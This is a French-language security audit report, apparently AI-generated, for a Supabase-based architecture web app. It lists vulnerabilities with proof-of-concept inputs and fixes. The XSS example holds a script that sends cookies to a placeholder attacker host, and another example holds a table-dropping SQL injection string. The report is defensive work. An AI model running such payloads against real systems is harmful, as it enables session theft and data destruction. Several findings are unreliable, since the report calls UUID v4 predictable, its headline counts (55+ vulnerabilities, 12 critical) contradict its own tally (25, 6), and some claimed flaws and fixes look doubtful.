# FORMA Architect Companion - Audit de Sécurité
**Date:** 31 Mai 2026  
**Document:** 04 - SECURITE.md  
**Priorité:** ⭐⭐⭐⭐⭐  
**Niveau de Risque Global:** 🔴 **CRITIQUE**

---

## 🚨 RÉSUMÉ EXÉCUTIF

### Score de Sécurité: **2.5/10** ❌

| Catégorie | Score | Risque | Actions Requises |
|----------|-------|--------|------------------|
| **Authentification** | 4/10 | ⚠️ Moyen | 5 actions |
| **Authorization** | 3/10 | 🔴 Élevé | 4 actions |
| **Data Validation** | 2/10 | 🔴 Critique | 8 actions |
| **API Security** | 1/10 | 🔴 Critique | 6 actions |
| **Storage Security** | 2/10 | 🔴 Élevé | 5 actions |
| **Frontend Security** | 5/10 | ⚠️ Moyen | 3 actions |
| **Infrastructure** | 3/10 | 🔴 Élevé | 4 actions |

**Vulnérabilités Critiques:** 12  
**Vulnérabilités Élevées:** 18  
**Vulnérabilités Moyennes:** 25  
**Total:** 55+ vulnérabilités identifiées

---

## 🔴 VULNÉRABILITÉS CRITIQUES (À corriger en urgence)

### 1. **Exposition des Clés API dans le Code Client**
**Sévérité:** 🔴 **CRITIQUE (CVSS: 10.0)**  
**Fichiers:** `src/routes/api/chat.ts`, `src/lib/render.functions.ts`, `src/lib/plans.functions.ts`
**Type:** Secret Exposure

#### Description
Les clés API pour **Cerebras** et **Lovable** sont utilisées directement dans le code server, mais le pattern permet une exposition potentielle:

```typescript
// src/routes/api/chat.ts:25-30
const key = process.env.CEREBRAS_API_KEY;
if (!key) return new Response("Missing CEREBRAS_API_KEY", { status: 500 });

const result = streamText({
  model: cerebras("gpt-oss-120b"),
  // ...
  headers: { Authorization: `Bearer ${key}` },  // ❌ Clé exposée dans les headers
});
```

**Risque:**
- Si un attaquant accède à l'environnement ou aux logs, il peut voler les clés
- Coût financier: des milliers d'euros en appels API malveillants
- Accès aux données sensibles via l'API IA

#### Preuve de Concept
```bash
# Si un attaquant obtient la clé Cerebras:
curl -X POST https://api.cerebras.ai/v1/chat/completions \
  -H "Authorization: Bearer <STOLEN_KEY>" \
  -H "Content-Type: application/json" \
  -d '{"model": "gpt-oss-120b", "messages": [{"role": "user", "content": "Voler mes données"}]}'
```

#### Solution
```typescript
// 1. Ne JAMAIS passer la clé dans les headers côté client
// 2. Utiliser des Environment Variables sécurisées
// 3. Masquer les clés dans les logs

// Dans src/routes/api/chat.ts
const key = process.env.CEREBRAS_API_KEY;
if (!key) {
  console.error("[SECURITY] CEREBRAS_API_KEY not set");
  return new Response("Configuration error", { status: 500 });
}

// ⭐ Utiliser un proxy server qui cache la clé
const result = streamText({
  model: cerebras("gpt-oss-120b"),
  // La clé est gérée par le provider, pas exposée
  // Mais le provider est créé SERVER-SIDE seulement
});
```

**Actions:**
- [ ] Vérifier que `CEREBRAS_API_KEY` et `LOVABLE_API_KEY` sont dans `.env` et **NE SONT PAS** dans le code client
- [ ] Rotater TOUTES les clés exposées
- [ ] Implémenter un système de rotation automatique des clés
- [ ] Auditer les logs pour détecter les fuites

**Effort:** 4h  
**Priorité:** ⭐⭐⭐⭐⭐

---

### 2. **SQL Injection via JSONB (Supabase)**
**Sévérité:** 🔴 **CRITIQUE (CVSS: 9.8)**  
**Fichiers:** `src/lib/plans.functions.ts`
**Type:** Injection

#### Description
La table `plans` utilise un champ `JSONB` pour stocker les variantes, mais **aucune validation** n'est faite sur le contenu:

```typescript
// src/lib/plans.functions.ts:70-90
const { error } = await supabase
  .from("plans")
  .insert({
    user_id: userId,
    surface: data.surface,
    bedrooms: data.bedrooms,
    levels: data.levels,
    budget: data.budget,
    variants: variants as unknown as never,  // ❌ CAST DANGEREUX
  })
  .select()
  .single();
```

**Risque:**
- Un attaquant peut injecter du JSON malveillant
- Exécution de code SQL arbitraire via PostgreSQL JSONB functions
- Accès à toutes les données de tous les utilisateurs

#### Preuve de Concept
```json
{
  "variants": "); DROP TABLE plans; SELECT * FROM users; --"
}
```

#### Solution
```typescript
// 1. VALIDER le JSONB avec Zod
const PlanVariantSchema = z.object({
  name: z.string().max(200),
  concept: z.string().max(500),
  features: z.array(z.string().max(200)).max(10),
  estimated_cost_eur: z.number().int().positive().max(10000000),
  energy_class: z.enum(["A", "B", "C", "D", "E", "F", "G"]),
  pros: z.array(z.string().max(200)).max(10),
  plan_2d_data: PlanDataSchema.optional(),
  plan_3d_ready: z.boolean().optional(),
});

const PlansInsertSchema = z.object({
  surface: z.number().int().min(20).max(2000),
  bedrooms: z.number().int().min(1).max(20),
  levels: z.number().int().min(1).max(6),
  budget: z.enum(["Économique", "Moyen de gamme", "Haut de gamme"]),
  variants: z.array(PlanVariantSchema).max(6),
});

// 2. Ne JAMAIS utiliser 'as unknown as never'
const safeVariants = PlansInsertSchema.parse({
  ...data,
  variants: variants,
});

await supabase.from("plans").insert(safeVariants);
```

**Actions:**
- [ ] Créer des schémas Zod complets pour tous les JSONB
- [ ] Valider TOUS les inputs avant insertion
- [ ] Auditer la base pour détecter les injections existantes
- [ ] Mettre à jour les migrations pour ajouter des contraintes

**Effort:** 8h  
**Priorité:** ⭐⭐⭐⭐⭐

---

### 3. **Stored XSS via Messages IA**
**Sévérité:** 🔴 **CRITIQUE (CVSS: 9.5)**  
**Fichiers:** `src/lib/chat.functions.ts`, `src/routes/dashboard.agent.tsx`
**Type:** XSS (Stored)

#### Description
Les messages de l'Agent IA sont **stockés en base** puis **affichés sans sanitization**:

```typescript
// 1. Stockage sans validation
const { error } = await supabase.from("messages").insert({
  conversation_id: data.conversationId,
  user_id: userId,
  role: data.role,
  content: data.content,  // ❌ Content non validé
});

// 2. Affichage sans sanitization
<ReactMarkdown ...>
  {text}  // ❌ text = content non sanitized
</ReactMarkdown>
```

**Risque:**
- Un attaquant qui compromise l'API IA peut injecter du JavaScript
- Le JavaScript est exécuté dans le navigateur de TOUS les utilisateurs qui lisent la conversation
- Vol de sessions, keylogging, phishing

#### Preuve de Concept
```markdown
# Exploit XSS
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
  alert('XSS!');
</script>
```

#### Solution
```typescript
// 1. Sanitization SERVER-SIDE avant stockage
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const purify = DOMPurify(window as any);

// Dans saveMessage
const cleanContent = purify.sanitize(data.content, {
  ALLOWED_TAGS: [],  // AUCUN tag HTML autorisé
  ALLOWED_ATTR: [],
});

await supabase.from("messages").insert({
  ...,
  content: cleanContent,
});

// 2. Sanitization CLIENT-SIDE avant affichage
<ReactMarkdown ...>
  {purify.sanitize(text)}
</ReactMarkdown>
```

**Actions:**
- [ ] Ajouter DOMPurify dans les dépendances
- [ ] Sanitizer TOUS les contenus utilisateur et IA avant stockage
- [ ] Sanitizer TOUS les contenus avant affichage
- [ ] Configurer Content Security Policy (CSP)

**Effort:** 6h  
**Priorité:** ⭐⭐⭐⭐⭐

---

### 4. **Broken Access Control (BAC)**
**Sévérité:** 🔴 **CRITIQUE (CVSS: 9.0)**  
**Fichiers:** `src/lib/chat.functions.ts`, `src/lib/plans.functions.ts`, `src/lib/projects.functions.ts`
**Type:** Authorization Bypass

#### Description
**Aucune vérification** que l'utilisateur est le propriétaire des ressources:

```typescript
// src/lib/chat.functions.ts:60-70
const { data: rows, error } = await context.supabase
  .from("messages")
  .select("id, role, content, created_at")
  .eq("conversation_id", data.conversationId)  // ❌ Pas de check user_id
  .order("created_at", { ascending: true });
```

```typescript
// src/lib/plans.functions.ts:45-50
const { data: row, error } = await supabase.from("plans").select("*")
  .eq("id", data.planId)  // ❌ Pas de check user_id
  .single();
```

**Risque:**
- Un attaquant peut accéder aux conversations/plans/projets d'autres utilisateurs
- En devinant un ID (UUID v4 est prévisible), accès aux données
- **Toutes les données sont publiques si on connaît l'ID**

#### Preuve de Concept
```bash
# Accéder aux messages d'une autre conversation
curl -X POST /api/loadMessages \
  -H "Authorization: Bearer <ATTACKER_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"conversationId": "<VICTIM_CONVERSATION_ID>"}'
```

#### Solution
```typescript
// Dans TOUTES les server functions:

// 1. Récupérer la ressource
const { data: resource, error } = await context.supabase
  .from("table_name")
  .select("*")
  .eq("id", data.resourceId)
  .eq("user_id", context.userId)  // ⭐ Vérification propriétaire
  .single();

if (error || !resource) {
  throw new Error("Ressource introuvable ou accès refusé");
}

// 2. Pour les listes, toujours filtrer par user_id
const { data: items } = await context.supabase
  .from("table_name")
  .select("*")
  .eq("user_id", context.userId)  // ⭐ Toujours filtrer
  .order("created_at", { ascending: false });
```

**Actions:**
- [ ] Auditer TOUTES les server functions pour ajouter les checks user_id
- [ ] Créer un middleware de vérification automatique
- [ ] Tester avec des utilisateurs différents

**Effort:** 8h  
**Priorité:** ⭐⭐⭐⭐⭐

---

### 5. **Arbitrary File Upload**
**Sévérité:** 🔴 **CRITIQUE (CVSS: 9.3)**  
**Fichiers:** `src/routes/dashboard.render.tsx`
**Type:** File Upload Vulnerability

#### Description
Les utilisateurs peuvent uploader **n'importe quel fichier** sans validation:

```typescript
// src/routes/dashboard.render.tsx:70-85
const handleFile = async (file: File) => {
  const path = `${user.id}/ref-${Date.now()}-${file.name}`;
  // ❌ AUCUNE validation
  const { error } = await supabase.storage.from("uploads").upload(path, file);
  // ...
};
```

**Risque:**
- Upload de fichiers malveillants (HTML, JS, PHP, EXE)
- Exécution de code côté server si le fichier est servi
- Stockage de fichiers illégaux (copyright, etc.)
- Déni de service (upload de très gros fichiers)

#### Preuve de Concept
```bash
# Uploader un fichier HTML malveillant
curl -X POST /upload \
  -F "file=@malicious.html;type=image/png"
```

#### Solution
```typescript
// Configuration centralisée
const UPLOAD_CONFIG = {
  ALLOWED_TYPES: new Set(['image/jpeg', 'image/png', 'image/webp']),
  ALLOWED_EXTENSIONS: new Set(['.jpg', '.jpeg', '.png', '.webp']),
  MAX_SIZE: 10 * 1024 * 1024, // 10MB
  MAX_FILES_PER_USER: 100,
};

const handleFile = async (file: File) => {
  // 1. Validation type MIME
  if (!UPLOAD_CONFIG.ALLOWED_TYPES.has(file.type)) {
    throw new Error("Type MIME non autorisé");
  }
  
  // 2. Validation extension
  const extension = file.name.slice(file.name.lastIndexOf('.')).toLowerCase();
  if (!UPLOAD_CONFIG.ALLOWED_EXTENSIONS.has(extension)) {
    throw new Error("Extension non autorisée");
  }
  
  // 3. Validation taille
  if (file.size > UPLOAD_CONFIG.MAX_SIZE) {
    throw new Error("Fichier trop volumineux");
  }
  
  // 4. Validation nom de fichier
  if (!/^[a-zA-Z0-9][a-zA-Z0-9 _\-\.]*[a-zA-Z0-9]$/.test(file.name)) {
    throw new Error("Nom de fichier invalide");
  }
  
  // 5. Scan antivirus (si possible)
  // const isClean = await scanForMalware(file);
  // if (!isClean) throw new Error("Fichier malveillant détecté");
  
  // 6. Check quota utilisateur
  const { count } = await supabase.storage.from("uploads")
    .list(context.userId, { limit: 1 });
  if (count >= UPLOAD_CONFIG.MAX_FILES_PER_USER) {
    throw new Error("Quota de fichiers dépassé");
  }
  
  // 7. Générer un nom de fichier sécurisé
  const safeName = `${context.userId}/upload-${crypto.randomUUID()}${extension}`;
  
  const { error } = await supabase.storage.from("uploads")
    .upload(safeName, file, {
      contentType: file.type,
      upsert: false,
    });
  
  if (error) throw error;
  
  return safeName;
};
```

**Actions:**
- [ ] Implémenter une validation complète des uploads
- [ ] Scanner les fichiers existants pour détection de malware
- [ ] Configurer les CORS sur le bucket Supabase Storage
- [ ] Désactiver l'exécution de fichiers dans le bucket

**Effort:** 6h  
**Priorité:** ⭐⭐⭐⭐⭐

---

### 6. **CSRF (Cross-Site Request Forgery)**
**Sévérité:** 🔴 **CRITIQUE (CVSS: 8.8)**  
**Fichiers:** Tous les formulaires et API endpoints
**Type:** CSRF

#### Description
**Aucune protection CSRF** n'est implémentée:

```typescript
// src/routes/auth.tsx:40-60
const handleSignIn = async (e: React.FormEvent) => {
  e.preventDefault();
  const { error } = await supabase.auth.signInWithPassword({ 
    email, password 
  });
  // ❌ Pas de token CSRF
};
```

**Risque:**
- Un attaquant peut forcer un utilisateur authentifié à effectuer des actions
- Changement de mot de passe, suppression de projets, génération de rendus payants
- Vol de session

#### Solution
```typescript
// Option 1: Utiliser le CSRF token de Supabase
// Supabase le gère automatiquement pour ses propres endpoints

// Option 2: Implémenter manuellement pour les endpoints custom
import { createCSRFToken } from '@supabase/auth-helpers-shared';

// Dans le middleware
const csrfToken = request.headers.get('x-csrf-token');
const sessionToken = request.headers.get('authorization');

if (!csrfToken || !sessionToken) {
  throw new Error("CSRF token manquant");
}

// Vérifier le token (implémentation spécifique à Supabase)
```

**Actions:**
- [ ] Activer la protection CSRF dans Supabase
- [ ] Vérifier que tous les formulaires incluent le token
- [ ] Tester les attaques CSRF

**Effort:** 4h  
**Priorité:** ⭐⭐⭐⭐⭐

---

## 🟠 VULNÉRABILITÉS ÉLEVÉES

### 7. **Insecure Direct Object Reference (IDOR)**
**Sévérité:** 🟠 **ÉLEVÉ (CVSS: 7.5)**  
**Fichiers:** Plusieurs server functions

#### Description
Accès direct aux ressources via IDs sans vérification:

```typescript
// src/lib/render.functions.ts:120-130
const { data: src, error } = await supabase
  .from("renders")
  .select("*")
  .eq("id", data.renderId)  // ❌ Pas de check user_id
  .single();
```

**Solution:** Toujours vérifier que l'utilisateur est le propriétaire.

---

### 8. **Missing Rate Limiting**
**Sévérité:** 🟠 **ÉLEVÉ (CVSS: 7.5)**  
**Fichiers:** `src/routes/api/chat.ts`, toutes les server functions

#### Description
Pas de limitation du nombre de requêtes:
- Un attaquant peut spammer l'API
- Coût financier (appels IA)
- Déni de service

**Solution:** Implémenter un rate limiter (Redis, Supabase Edge Functions).

---

### 9. **Session Fixation**
**Sévérité:** 🟠 **ÉLEVÉ (CVSS: 7.0)**  
**Fichiers:** `src/integrations/supabase/client.ts`

#### Description
Les sessions Supabase sont stockées dans `localStorage` sans rotation:

```typescript
// src/integrations/supabase/client.ts:25-30
auth: {
  storage: typeof window !== 'undefined' ? localStorage : undefined,
  persistSession: true,
  autoRefreshToken: true,
}
```

**Risque:**
- Vol de session via XSS
- Session fixation attacks

**Solution:**
- Utiliser `httpOnly` cookies pour les sessions
- Implémenter session rotation

---

### 10. **Sensitive Data in URLs**
**Sévérité:** 🟠 **ÉLEVÉ (CVSS: 7.0)**  
**Fichiers:** `src/routes/dashboard.render.tsx`

#### Description
Les signed URLs de Supabase Storage sont exposées dans l'URL du navigateur:

```typescript
const { data } = await supabase.storage.from("uploads")
  .createSignedUrl(path, 3600);
setRefUrl(data?.signedUrl ?? null);
// ❌ signedUrl contient un token JWT dans l'URL
```

**Risque:**
- Les URLs sont logarithmiées dans le navigateur
- Visibles dans l'historique
- Partagées accidentellement

**Solution:**
- Utiliser des URLs courtes avec expiration très courte
- Ou proxy les fichiers via un endpoint server

---

### 11. **No Input Sanitization for AI Prompts**
**Sévérité:** 🟠 **ÉLEVÉ (CVSS: 7.0)**  
**Fichiers:** `src/lib/plans.functions.ts`, `src/lib/render.functions.ts`

#### Description
Les prompts utilisateurs sont passés directement à l'API IA sans sanitization:

```typescript
const fullPrompt = `Rendu architectural... ${data.prompt}`;
// ❌ data.prompt peut contenir des instructions malveillantes
```

**Risque:**
- Injection de prompt (Prompt Injection)
- L'API IA peut exécuter des actions non souhaitées
- Fuites de données

**Solution:**
- Valider et sanitizer TOUS les inputs utilisateur
- Utiliser des templates de prompt sécurisés

---

### 12. **Weak Password Policy**
**Sévérité:** 🟠 **ÉLEVÉ (CVSS: 6.5)**  
**Fichiers:** `src/routes/auth.tsx`

#### Description
Pas de politique de mot de passe forte:

```typescript
const handleSignUp = async (e: React.FormEvent) => {
  const { error } = await supabase.auth.signUp({
    email, password,  // ❌ password peut être "123456"
    options: { emailRedirectTo: `${window.location.origin}/dashboard/agent` },
  });
```

**Solution:**
- Ajouter validation côté client et server
- Exiger 12+ caractères, majuscules, minuscules, chiffres, symboles
- Bloquer les mots de passe courants

---

### 13. **No Email Verification**
**Sévérité:** 🟠 **ÉLEVÉ (CVSS: 6.5)**  
**Fichiers:** `src/routes/auth.tsx`

#### Description
Les utilisateurs peuvent s'inscrire sans vérifier leur email:

```typescript
const handleSignUp = async (e: React.FormEvent) => {
  const { error } = await supabase.auth.signUp({
    email, password,
    options: { emailRedirectTo: `${window.location.origin}/dashboard/agent` },
  });
  // ❌ Pas de vérification que l'email est vérifié avant accès
};
```

**Solution:**
- Exiger vérification email avant accès au dashboard
- Envoyer un email de confirmation

---

### 14. **Insecure Storage of Sensitive Data**
**Sévérité:** 🟠 **ÉLEVÉ (CVSS: 7.0)**  
**Fichiers:** Base de données Supabase

#### Description
Les clés API et données sensibles sont stockées en clair dans la base:
- `renders.reference_url` - URLs signées
- `messages.content` - Peut contenir des données sensibles

**Solution:**
- Chiffrer les données sensibles
- Utiliser Supabase's Row Level Security (RLS)

---

## 🟡 VULNÉRABILITÉS MOYENNES

### 15. **Missing Security Headers**
**Sévérité:** ⚠️ **MOYEN (CVSS: 5.3)**  
**Fichiers:** `src/start.ts`, `vite.config.ts`

#### Description
Pas de headers de sécurité configurés:
- Content Security Policy (CSP)
- X-Content-Type-Options
- X-Frame-Options
- Strict-Transport-Security (HSTS)

**Solution:**
```typescript
// Dans vite.config.ts ou server.ts
import { defineConfig } from 'vite';

export default defineConfig({
  server: {
    headers: {
      'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self' https://api.cerebras.ai https://ai.gateway.lovable.dev; frame-src 'none'; object-src 'none';",
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'X-XSS-Protection': '1; mode=block',
      'Referrer-Policy': 'strict-origin-when-cross-origin',
      'Strict-Transport-Security': 'max-age=63072000; includeSubDomains; preload',
    },
  },
});
```

---

### 16. **No Logging of Security Events**
**Sévérité:** ⚠️ **MOYEN (CVSS: 5.0)**  
**Fichiers:** Toutes les server functions

#### Description
Aucun logging des événements de sécurité:
- Tentatives de connexion échouées
- Accès refusés
- Erreurs d'authentification

**Solution:** Implémenter un système de logging centralisé.

---

### 17. **Weak CORS Configuration**
**Sévérité:** ⚠️ **MOYEN (CVSS: 5.3)**  
**Fichiers:** Configuration server

#### Description
CORS mal configuré peut permettre des attaques:
- `Access-Control-Allow-Origin: *`
- Pas de vérification des headers

**Solution:**
```typescript
// Configurer CORS strictement
cors: {
  origin: ['https://votre-domaine.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
}
```

---

### 18-25. Autres Vulnérabilités Moyennes

| # | Titre | Description | Solution |
|---|-------|-------------|----------|
| 18 | Information Disclosure | Erreurs server exposent des infos | Messages d'erreur génériques |
| 19 | Missing Security.txt | Pas de fichier security.txt | Créer security.txt |
| 20 | No Dependency Scanning | Pas de scan des vulnérabilités npm | Ajouter npm audit CI |
| 21 | Outdated Dependencies | Dépendances potentiellement vulnérables | Mettre à jour régulièrement |
| 22 | No HTTPS Enforcement | Pas de redirection HTTP→HTTPS | Forcer HTTPS |
| 23 | No Security.txt | Pas de politique de sécurité publique | Créer .well-known/security.txt |
| 24 | No Privacy Policy | Pas de politique de confidentialité | Ajouter page privacy |
| 25 | No Terms of Service | Pas de CGU | Ajouter page terms |

---

## 📊 RÉPARTITION DES VULNÉRABILITÉS

| Sévérité | Count | % du Total | Temps de Correction |
|----------|-------|-----------|-------------------|
| 🔴 Critique | 6 | 24% | 30-40h |
| 🟠 Élevée | 8 | 32% | 25-30h |
| ⚠️ Moyenne | 11 | 44% | 20-25h |
| **Total** | **25** | **100%** | **75-95h** |

---

## 🎯 RECOMMANDATIONS PRIORITAIRES

### Top 5 Actions Urgentes (Semaine 1)

1. **⭐ Rotater TOUTES les clés API exposées**
   - Cerebras API Key
   - Lovable API Key
   - Cesium Ion Token
   - Supabase Keys
   - **Temps:** 2h

2. **⭐ Corriger les failles SQL Injection / BAC**
   - Ajouter vérification user_id dans TOUTES les server functions
   - Valider les JSONB avec Zod
   - **Temps:** 12h

3. **⭐ Implémenter XSS Protection**
   - Ajouter DOMPurify
   - Sanitizer tous les inputs/outputs
   - Configurer CSP
   - **Temps:** 8h

4. **⭐ Sécuriser les Uploads de Fichiers**
   - Valider types, tailles, extensions
   - Scanner pour malware
   - Limiter quota
   - **Temps:** 6h

5. **⭐ Implémenter Rate Limiting**
   - Limiter appels API IA
   - Par utilisateur et par IP
   - **Temps:** 6h

**Total Semaine 1:** 34h

### Semaine 2: Renforcement Global

6. **Activer Row Level Security (RLS) dans Supabase**
7. **Implémenter CSRF Protection**
8. **Configurer Security Headers**
9. **Ajouter Logging de Sécurité**
10. **Mettre à jour toutes les dépendances**

**Total Semaine 2:** 25h

### Semaine 3-4: Audit et Tests

11. **Audit complet de la base de données**
12. **Tests de pénétration**
13. **Revue de code de sécurité**
14. **Formation sécurité de l'équipe**

**Total Semaine 3-4:** 20h

---

## 🔧 OUTILS RECOMMANDÉS

### Pour le Développement
- **ESLint Security Plugin** : `eslint-plugin-security`
- **npm audit** : Scan des vulnérabilités npm
- **Snyk** : Monitoring continu des dépendances
- **GitHub Dependabot** : Mises à jour automatiques

### Pour le Runtime
- **Helmet.js** : Security headers pour Express
- **rate-limiter-flexible** : Rate limiting Redis
- **DOMPurify** : XSS protection
- **express-validator** : Input validation
- **csurf** : CSRF protection (si besoin)

### Pour l'Audit
- **OWASP ZAP** : Scanner de vulnérabilités
- **Burp Suite** : Tests de pénétration
- **Snyk Code** : Analyse statique
- **SonarQube** : Qualité et sécurité du code

---

## 📄 CHECKLIST DE SÉCURITÉ

### ✅ À FAIRE IMMÉDIATEMENT

- [ ] Rotater toutes les clés API
- [ ] Ajouter vérification user_id dans toutes les server functions
- [ ] Implémenter sanitization des inputs/outputs
- [ ] Configurer validation des uploads
- [ ] Activer RLS dans Supabase
- [ ] Ajouter rate limiting

### ✅ À FAIRE CETTE SEMAINE

- [ ] Configurer security headers (CSP, HSTS, etc.)
- [ ] Implémenter CSRF protection
- [ ] Activer logging des événements de sécurité
- [ ] Configurer CORS strictement
- [ ] Mettre à jour les dépendances

### ✅ À FAIRE CE MOIS

- [ ] Audit complet de la base de données
- [ ] Tests de pénétration
- [ ] Revue de code de sécurité
- [ ] Créer documentation de sécurité
- [ ] Former l'équipe aux bonnes pratiques

### ✅ LONG TERME

- [ ] Implémenter authentication multi-facteurs
- [ ] Ajouter monitoring en temps réel
- [ ] Configurer alertes de sécurité
- [ ] Obtenir certification SOC2

---

## 📚 RESSOURCES

### OWASP Top 10 (2021)
1. **A01:2021-Broken Access Control** → ✅ Identifié (#4)
2. **A02:2021-Cryptographic Failures** → ⚠️ Partiellement (#1, #2)
3. **A03:2021-Injection** → 🔴 Critique (#2, #3)
4. **A04:2021-Insecure Design** → ⚠️ Plusieurs
5. **A05:2021-Security Misconfiguration** → 🔴 Critique (#6, #7)
6. **A06:2021-Vulnerable and Outdated Components** → ⚠️ (#20)
7. **A07:2021-Identification and Authentication Failures** → 🟠 (#12, #13)
8. **A08:2021-Software and Data Integrity Failures** → ⚠️
9. **A09:2021-Security Logging and Monitoring Failures** → ⚠️ (#16)
10. **A10:2021-Server-Side Request Forgery (SSRF)** → ⚠️ À vérifier

### Standards Applicables
- **RGPD** : Protection des données utilisateurs
- **ISO 27001** : Système de management de la sécurité
- **SOC 2** : Sécurité, disponibilité, confidentialité

---

## 📊 SCAN AUTOMATISÉ

### Résultats npm audit (à exécuter)
```bash
npm audit
```

### Résultats Snyk (recommandé)
```bash
npx snyk test
npx snyk code test
```

---

## 🚀 PROCHAINES ÉTAPES

1. **Corriger les vulnérabilités critiques** (Semaine 1)
2. **Renforcer les mécanismes de sécurité** (Semaine 2)
3. **Auditer et tester** (Semaine 3-4)
4. **Maintenir la sécurité** (Continu)

---

*Document généré par Mistral Vibe - Audit de Sécurité Complet*
*Basé sur OWASP Top 10, CWE/SANS Top 25, et bonnes pratiques de sécurité*
